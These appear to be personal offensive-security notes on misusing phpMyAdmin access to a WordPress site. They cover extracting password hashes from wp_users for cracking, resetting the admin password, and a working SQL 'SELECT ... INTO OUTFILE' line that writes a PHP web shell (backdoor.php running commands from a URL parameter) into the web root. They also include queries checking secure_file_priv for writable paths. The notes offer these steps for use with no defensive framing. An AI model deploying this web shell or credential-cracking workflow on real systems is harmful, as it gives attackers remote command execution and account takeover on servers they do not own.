# phpmyadmin to get wordpress hash for crackin or set new password 

## get hash in wp_users table 


## set new password
https://ehikioya.com/wordpress-password-hash-generator/  

login to wp-admin 

## write shell into file
create database --> choose database and press SQL

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

## No write permission --> --secure file Priv

get files to write to

```sql
select @@secure_file_priv;
select @@global.secure_file_priv;
show variables like "secure_file_priv"; 
```
#


tags: wordpress phpmyadmin
